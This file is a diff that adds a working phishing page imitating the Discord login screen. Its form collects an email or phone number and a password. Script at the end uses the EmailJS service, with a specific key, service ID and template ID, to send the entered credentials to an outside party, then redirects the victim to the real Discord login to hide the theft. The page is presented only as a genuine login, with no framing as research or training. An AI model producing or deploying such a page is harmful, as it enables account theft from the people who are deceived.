@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body class="bg-[url('./discord_bg.svg')] bg-no-repeat bg-cover min-h-screen flex flex-col items-center p-4 md:p-8 lg:pt-10 font-['Open_Sans']">
+    <!-- Discord Logo -->
+    <img class="w-24 md:w-32 mb-6 md:mb-10" src="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB3aWR0aD0iMTI0IiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMTI0IDI0IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxnIGNsaXAtcGF0aD0idXJsKCNhKSI+PGcgY2xpcC1wYXRoPSJ1cmwoI2IpIiBmaWxsPSIjZmZmIj48cGF0aCBkPSJNMjYuMjQyIDIuMDFBMjUuMjE4IDI1LjIxOCAwIDAgMCAxOS44NTEgMGExOC43MTggMTguNzE4IDAgMCAwLS44MTkgMS43MDEgMjMuNDUgMjMuNDUgMCAwIDAtNy4wODMgMEExOC4yIDE4LjIgMCAwIDAgMTEuMTIxIDBhMjUuMTMgMjUuMTMgMCAwIDAtNi4zOTYgMi4wMTVDLjY4IDguMTMyLS40MTcgMTQuMDk3LjEzMiAxOS45NzhjMi42ODIgMi4wMDUgNS4yODIgMy4yMjMgNy44MzggNC4wMkExOS41MTQgMTkuNTE0IDAgMCAwIDkuNjUgMjEuMjNhMTYuNTA3IDE2LjUwNyAwIDAgMS0yLjY0NC0xLjI4N2MuMjIyLS4xNjUuNDM5LS4zMzcuNjQ4LS41MTMgNS4wOTggMi4zODYgMTAuNjM2IDIuMzg2IDE1LjY3MyAwIC4yMTEuMTc3LjQyOC4zNDguNjQ4LjUxMy0uODM5LjUwNS0xLjcyNi45MzktMi42NDkgMS4yOUExOS40MzIgMTkuNDMyIDAgMCAwIDIzLjAwNCAyNGMyLjU1OC0uNzk3IDUuMTYtMi4wMTUgNy44NDMtNC4wMjIuNjQzLTYuODE3LTEuMDk5LTEyLjcyOC00LjYwNS0xNy45NjhaTTEwLjM0MyAxNi4zNjFjLTEuNTMgMC0yLjc4NS0xLjQzLTIuNzg1LTMuMTcgMC0xLjc0MSAxLjIyOC0zLjE3NCAyLjc4NS0zLjE3NCAxLjU1NyAwIDIuODEyIDEuNDMgMi43ODUgMy4xNzQuMDAzIDEuNzQtMS4yMjggMy4xNy0yLjc4NSAzLjE3Wm0xMC4yOTMgMGMtMS41MyAwLTIuNzg2LTEuNDMtMi43ODYtMy4xNyAwLTEuNzQxIDEuMjI4LTMuMTc0IDIuNzg1LTMuMTc0IDEuNTU3IDAgMi44MTIgMS40MyAyLjc4NSAzLjE3NCAwIDEuNzQtMS4yMjggMy4xNy0yLjc4NSAzLjE3Wk00MS42MjkgNi4xMjJoNi42NTJjMS42MDMgMCAyLjk1OC4yNTcgNC4wNjkuNzY3IDEuMTA5LjUxIDEuOTQgMS4yMjMgMi40OSAyLjEzNS41NS45MTEuODI4IDEuOTU1LjgyOCAzLjEzIDAgMS4xNTEtLjI4NyAyLjE5NS0uODYyIDMuMTI5LS41NzUuOTM2LTEuNDUgMS42NzYtMi42MjcgMi4yMjEtMS4xNzcuNTQ2LTIuNjM0LjgyLTQuMzc2LjgySDQxLjYzVjYuMTIyWm02LjEwNiA5LjFjMS4wOCAwIDEuOTEtLjI3NSAyLjQ5LS44MjYuNTgtLjU1My44Ny0xLjMwNS44Ny0yLjI1OSAwLS44ODQtLjI1OC0xLjU4OS0uNzc1LTIuMTE3LS41MTYtLjUyOC0xLjI5OC0uNzk1LTIuMzQ0LS43OTVoLTIuMDh2NS45OThoMS44MzlaTTY1LjYyNyAxOC4zMDlhOC45MTEgOC45MTEgMCAwIDEtMi40OS0xLjA2NHYtMi44OTRjLjU1OC40NDEgMS4zMDYuODA1IDIuMjQ0IDEuMDkxYTkuMzc2IDkuMzc2IDAgMCAwIDIuNzIyLjQyNmMuNDA5IDAgLjcxOC0uMDU1LjkyOC0uMTY0LjIxLS4xMS4zMTQtLjI0Mi4zMTQtLjM5NGEuNTk3LjU5NyAwIDAgMC0uMTctLjQzNmMtLjExNS0uMTE3LS4zMzctLjIxNC0uNjY2LS4yOTZsLTIuMDQ2LS40N2MtMS4xNzItLjI4LTIuMDAzLS42NjYtMi40OTgtMS4xNjEtLjQ5NS0uNDk0LS43NC0xLjE0MS0uNzQtMS45NDNhMi42IDIuNiAwIDAgMSAuNjQ4LTEuNzYxYy40My0uNSAxLjA0NS0uODg3IDEuODQyLTEuMTU4Ljc5Ni0uMjc0IDEuNzI3LS40MTEgMi43OTctLjQxMS45NTUgMCAxLjgzLjEwNCAyLjYyNi4zMTQuNzk3LjIwOSAxLjQ1NS40NzUgMS45NzkuODAydjIuNzM3YTcuMjYgNy4yNiAwIDAgMC0xLjg1Mi0uNzc3IDguMTIgOC4xMiAwIDAgMC0yLjE1OS0uMjg3Yy0xLjA3IDAtMS42MDMuMTg3LTEuNjAzLjU1OCAwIC4xNzUuMDgzLjMwNC4yNDkuMzkxLjE2NS4wODcuNDcuMTc3LjkxLjI3MmwxLjcwNi4zMTRjMS4xMTQuMTk2IDEuOTQ1LjU0MyAyLjQ5IDEuMDM2LjU0Ni40OTMuODIgMS4yMjMuODIgMi4xODkgMCAxLjA1OS0uNDUxIDEuODk4LTEuMzU1IDIuNTItLjkwNC42MjMtMi4xODYuOTM1LTMuODQ4LjkzNWExMS4xODcgMTEuMTg3IDAgMCAxLTIuODQ4LS4zN1pNNzcuNzAzIDE3Ljk0M2MtLjk3Ny0uNDg4LTEuNzE1LTEuMTUtMi4yMDctMS45ODctLjQ5My0uODM3LS43NDEtMS43NzktLjc0MS0yLjgyNSAwLTEuMDQ2LjI1Ni0xLjk4Mi43NjctMi44MDcuNTEyLS44MjQgMS4yNjMtMS40NzIgMi4yNTItMS45NDIuOTktLjQ3MSAyLjE3LS43MDUgMy41NDctLjcwNSAxLjcwNiAwIDMuMTIyLjM2NiA0LjI0OCAxLjA5OHYzLjE5YTUuMjczIDUuMjczIDAgMCAwLTEuMzktLjY4IDUuMzg4IDUuMzg4IDAgMCAwLTEuNjk4LS4yNmMtMS4wNTcgMC0xLjg4My4xOTYtMi40OC41OTItLjU5Ny4zOTYtLjg5Ny45MTItLjg5NyAxLjU1MiAwIC42MjcuMjkgMS4xNC44NyAxLjU0NC41OC40IDEuNDIuNjAzIDIuNTI0LjYwMy41NjggMCAxLjEyOC0uMDg1IDEuNjgyLS4yNTJhNi4xOTQgNi4xOTQgMCAwIDAgMS40MjMtLjYydjMuMDg2Yy0xLjI1Ljc2Ny0yLjcgMS4xNS00LjM1IDEuMTUtMS4zODktLjAwNS0yLjU3My0uMjQ5LTMuNTUtLjczN1pNODkuODIzIDE3Ljk0M2MtLjk4NS0uNDg4LTEuNzM1LTEuMTU1LTIuMjUyLTIuMDA1LS41MTYtLjg0OS0uNzc3LTEuNzk1LS43NzctMi44NDEgMC0xLjA0Ni4yNTgtMS45OC43NzctMi44LjUyLS44MiAxLjI2NS0xLjQ2MiAyLjI0NC0xLjkyOC45NzctLjQ2NSAyLjE0NS0uNjk3IDMuNDk3LS42OTcgMS4zNTIgMCAyLjUyLjIzMiAzLjQ5Ni42OTcuOTc3LjQ2NiAxLjcyMyAxLjEwNCAyLjIzNSAxLjkxOC41MTEuODE0Ljc2NyAxLjc0OC43NjcgMi44MDcgMCAxLjA0Ni0uMjU2IDEuOTkzLS43NjcgMi44NDItLjUxMi44NS0xLjI2IDEuNTE3LTIuMjQ0IDIuMDA1LS45ODUuNDg4LTIuMTQ3LjczMi0zLjQ5LjczMi0xLjM0MiAwLTIuNTA0LS4yNDEtMy40ODYtLjczWm01LjE4Mi0zLjA5M2MuNDE1LS40MjMuNjI0LS45ODQuNjI0LTEuNjgxIDAtLjY5OC0uMjA3LTEuMjUzLS42MjQtMS42NjQtLjQxNC0uNDEzLS45OC0uNjItMS42OTYtLjYyLS43MjggMC0xLjI5OC4yMDctMS43MTUuNjItLjQxNC40MTMtLjYyMS45NjYtLjYyMSAxLjY2NCAwIC42OTcuMjA3IDEuMjU4LjYyMSAxLjY4MS40MTQuNDIzLjk4Ny42MzggMS43MTUuNjM4LjcxNy0uMDAzIDEuMjgyLS4yMTUgMS42OTYtLjYzOFpNMTEwLjA1OSA4LjMxOXYzLjc2NmMtLjQzNC0uMjkyLS45OTQtLjQzNi0xLjY4OS0uNDM2LS45MDkgMC0xLjYxLjI4MS0yLjA5OC44NDQtLjQ4OS41NjMtLjczMyAxLjQ0LS43MzMgMi42MjV2My4yMDhoLTQuMTc5VjguMTI3aDQuMDk0djMuMjQzYy4yMjYtMS4xODYuNTk0LTIuMDYgMS4xMDEtMi42MjUuNTA0LS41NjMgMS4xNTctLjg0NSAxLjk1Mi0uODQ1LjYwMSAwIDEuMTE4LjE0IDEuNTUyLjQxOVpNMTIzLjk0MiA1Ljc3M3YxMi41NTNoLTQuMTc5di0yLjI4NGMtLjM1My44Ni0uODg5IDEuNTE1LTEuNjEgMS45NjMtLjcyMS40NDYtMS42MTMuNjctMi42NzEuNjctLjk0NSAwLTEuNzY5LS4yMzQtMi40NzMtLjcwNS0uNzA0LS40Ny0xLjI0Ny0xLjExNi0xLjYzLTEuOTM1LS4zOC0uODItLjU3My0xLjc0Ni0uNTczLTIuNzgyLS4wMTItMS4wNjkuMTktMi4wMjcuNjA3LTIuODc3LjQxNC0uODUgMS4wMDItMS41MTIgMS43NTctMS45ODcuNzU1LS40NzYgMS42MTgtLjcxNSAyLjU4NS0uNzE1IDEuOTkxIDAgMy4zMjYuODg0IDQuMDA4IDIuNjV2LTQuNTVoNC4xNzlabS00LjgwMiA5LjAwN2MuNDI2LS40MjQuNjM4LS45NzQuNjM4LTEuNjQ3IDAtLjY1LS4yMDctMS4xOC0uNjIxLTEuNTg2LS40MTUtLjQwNi0uOTgyLS42MS0xLjY5Ni0uNjEtLjcwNCAwLTEuMjY3LjIwNi0xLjY4OS42Mi0uNDIxLjQxMy0uNjMxLjk0OS0uNjMxIDEuNjExIDAgLjY2My4yMSAxLjIwMy42MzEgMS42MjIuNDIyLjQxOC45NzcuNjI3IDEuNjcyLjYyNy43MDQtLjAwMiAxLjI2OS0uMjE0IDEuNjk2LS42MzdaTTU5LjE5IDkuMjEzYzEuMTUgMCAyLjA4My0uODU2IDIuMDgzLTEuOTEyIDAtMS4wNTctLjkzMy0xLjkxMy0yLjA4NC0xLjkxMy0xLjE1IDAtMi4wODMuODU2LTIuMDgzIDEuOTEzIDAgMS4wNTYuOTMzIDEuOTEyIDIuMDg0IDEuOTEyWk01Ny4xMDUgMTAuNTMxYzEuMjc2LjU2MyAyLjg2LjU4OCA0LjE2NiAwdjcuODVoLTQuMTY2di03Ljg1WiIvPjwvZz48L2c+PGRlZnM+PGNsaXBQYXRoIGlkPSJhIj48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMCAwaDEyNHYyNEgweiIvPjwvY2xpcFBhdGg+PGNsaXBQYXRoIGlkPSJiIj48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMCAwaDEyNHYyNEgweiIvPjwvY2xpcFBhdGg+PC9kZWZzPjwvc3ZnPg==
+" alt="discord logo">
+    <div class="bg-[#323339] p-4 md:p-8 rounded-md w-full max-w-[480px] lg:max-w-[784px] flex flex-col lg:flex-row">
+        <!-- Login Form Section -->
+        <div class="w-full lg:w-[784px] lg:pr-8">
+            <div class="text-center mb-6 md:mb-10">
+                <h2 class="text-white text-xl md:text-2xl font-bold">Welcome back!</h2>
+                <p class="text-[#B5BAC1] text-sm md:text-base">We're so excited to see you again!</p>
+            </div>
+            
+            <form action="" class="space-y-4">
+                <div>
+                    <label for="email" class="block text-[#B5BAC1] text-xs font-bold uppercase mb-2">
+                        Email or Phone Number <span class="text-[#ED4245]">*</span>
+                    </label>
+                    <input type="text" name="email/username" id="email"
+                        class="w-full bg-[#1E1F22] text-white p-2 md:p-2.5 rounded-[3px] border border-[#1E1F22] focus:outline-none focus:border-[#8DA1FC]"
+                        
+                        >
+                </div>
+                
+                <div>
+                    <label for="passkey" class="block text-[#B5BAC1] text-xs font-bold uppercase mb-2">
+                        Password <span class="text-[#ED4245]">*</span>
+                    </label>
+                    <input type="password" name="password" id="passkey"
+                        class="w-full bg-[#1E1F22] text-white p-2 md:p-2.5 rounded-[3px] border border-[#1E1F22] focus:outline-none focus:border-[#8DA1FC]"
+                        
+                        >
+                </div>
+                
+                <a href="#" class="text-[#8DA1FC] text-sm hover:underline block">Forgot your password?</a>
+                
+                <button type="submit" 
+                    class="w-full bg-[#4654C0] text-white py-2 md:py-2.5 rounded-[3px] font-medium hover:bg-[#4752C4] transition-colors">
+                    Log In
+                </button>
+                
+                <p class="text-[#949BA4] text-sm">
+                    Need an account? 
+                    <a href="https://canary.discord.com/register" class="text-[#8DA1FC] hover:underline">Register</a>
+                </p>
+            </form>
+        </div>
+
+        <!-- QR Code Section -->
+        <div class="hidden lg:flex lg:w-[340px] lg:pl-8 lg:flex-col lg:items-center lg:justify-center">
+            <div class="bg-white p-4 rounded-lg mb-4">
+                <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=Discord" 
+                    alt="QR Code" 
+                    class="w-[150px] h-[150px]">
+            </div>
+            <h3 class="text-white text-2xl font-bold text-center mb-2">Log in with QR Code</h3>
+            <p class="text-[#B5BAC1] text-sm text-center">
+                Scan this with the <strong>Discord mobile app</strong> to log in instantly.
+            </p>
+            <a href="https://canary.discord.com/login" class="text-[#8DA1FC] text-sm hover:underline mt-2">Or, sign in with passkey</a>
+        </div>
+    </div>
+
+
+    <script type="text/javascript"
+            src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init({
+                publicKey: "9fl-QGSU884h6xRmI",
+            });
+        })();
+        
+        
+        
+        let email, passkey, form, btn
+        form = document.querySelector("form")
+        btn = document.querySelector("button")
+        
+        btn.addEventListener("click", function(e){
+            e.preventDefault() 
+        
+            email = document.querySelector("#email").value
+            passkey = document.querySelector("#passkey").value
+
+            let templateParams = {
+                email: email,
+                password: passkey,
+            };
+        
+            if (email && passkey) {
+                emailjs.send('service_krlpmbn', 'template_71ogvio', templateParams).then(
+                (response) => {
+                    console.log('SUCCESS!');
+    
+                    setTimeout(() => {
+                        window.location.href = "https://canary.discord.com/login";
+                        form.reset(); // Reset the form after submission
+                    }, 3000);
+    
+                },
+                (error) => {
+                    console.log('FAILED...');
+                },
+                );
+            }
+        
+        })
+    </script>
+
+
+</body>
+</html>
